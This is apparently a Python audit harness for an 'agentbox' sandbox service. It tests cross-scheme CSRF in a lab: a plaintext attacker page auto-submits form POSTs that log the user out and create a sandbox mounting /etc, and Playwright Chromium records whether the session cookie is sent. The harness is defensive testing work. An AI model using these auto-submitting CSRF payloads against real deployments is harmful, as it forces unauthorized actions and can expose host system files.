"""parent-live N1: cross-scheme CSRF against a TLS deployment (Chromium).

Real control plane from the audited tree behind uvicorn TLS on https://agentbox.test:443 (self-signed lab
cert, loopback via --host-resolver-rules), a plaintext attacker page on http://agentbox.test:80 that
auto-submits top-level form POSTs, a dummy human token, and Playwright Chromium (only engine installed).
An ASGI wrapper logs, per request, whether the session cookie arrived and which Origin was sent.

usage: python3 parent_live_scheme.py <src-audited> <home> <cert> <key> <out.json>
"""
import json, os, sys, threading, time
from http.server import BaseHTTPRequestHandler, HTTPServer
SRC, HOME, CERT, KEY, OUT = sys.argv[1:6]
sys.path.insert(0, SRC)
TOKEN = "hum_" + "p" * 40
os.environ.update(AGENTBOX_HOME=HOME, AGENTBOX_HUMAN_TOKEN=TOKEN, AGENTBOX_IMAGE="buildpack-deps:noble-curl")
import uvicorn
from playwright.sync_api import sync_playwright
from agentbox.api import build
from agentbox.config import Settings

app, box, human = build(Settings())
LOG = []


async def logged(scope, receive, send):
    if scope["type"] == "http":
        h = {k.decode(): v.decode() for k, v in scope["headers"]}
        LOG.append({"method": scope["method"], "path": scope["path"], "origin": h.get("origin"),
                    "session_cookie_sent": "agentbox_session" in h.get("cookie", "")})
    await app(scope, receive, send)

ATTACK = {
    "/logout.html": '<form method=post action="https://agentbox.test/logout"></form><script>document.forms[0].submit()</script>',
    "/create.html": '<form method=post action="https://agentbox.test/ui/sandboxes"><input name=template value=cli>'
                    '<input name=source_dir value="/etc"></form><script>document.forms[0].submit()</script>',
}


class Attacker(BaseHTTPRequestHandler):
    def do_GET(self):
        body = ATTACK.get(self.path, "").encode()
        self.send_response(200 if body else 404)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass

srv = uvicorn.Server(uvicorn.Config(logged, host="127.0.0.1", port=443, ssl_certfile=CERT, ssl_keyfile=KEY, log_level="warning"))
threading.Thread(target=srv.run, daemon=True).start()
web = HTTPServer(("127.0.0.1", 80), Attacker)
threading.Thread(target=web.serve_forever, daemon=True).start()
while not srv.started:
    time.sleep(0.1)
res = {"engine": None, "steps": {}}
n0 = len(box.sandboxes.list())
try:
    with sync_playwright() as p:
        b = p.chromium.launch(executable_path="/opt/pw-browsers/chromium-1194/chrome-linux/chrome",
                              args=["--host-resolver-rules=MAP agentbox.test 127.0.0.1", "--no-proxy-server"])
        res["engine"] = "chromium " + b.version
        ctx = b.new_context(ignore_https_errors=True)
        pg = ctx.new_page()
        pg.goto("https://agentbox.test/login")
        pg.fill("input[name=token]", TOKEN)
        pg.press("input[name=token]", "Enter")
        pg.wait_for_load_state("networkidle")
        res["steps"]["cookie_after_login"] = [{k: c[k] for k in ("name", "secure", "sameSite", "httpOnly")} for c in ctx.cookies()]
        for name in ("create", "logout"):
            start = len(LOG)
            pg.goto(f"http://agentbox.test/{name}.html")
            pg.wait_for_load_state("networkidle")
            time.sleep(1)
            res["steps"][name] = {"requests": LOG[start:], "landed_on": pg.url,
                                  "cookie_still_in_browser": any(c["name"] == "agentbox_session" for c in ctx.cookies())}
        res["steps"]["sandboxes_created_by_cross_scheme_post"] = len(box.sandboxes.list()) - n0
        start = len(LOG)
        pg.goto("https://agentbox.test/ui")
        pg.wait_for_load_state("networkidle")
        res["steps"]["after_attack_get_ui"] = {"landed_on": pg.url, "requests": LOG[start:]}
        b.close()
finally:
    res["audit_ui_logout_rows"] = sum(1 for r in box.audit.list(limit=500) if r.get("event") == "ui_logout")
    srv.should_exit = True
    web.shutdown()
    open(OUT, "w").write(json.dumps(res, indent=1) + "\n")
    print(json.dumps(res, indent=1))
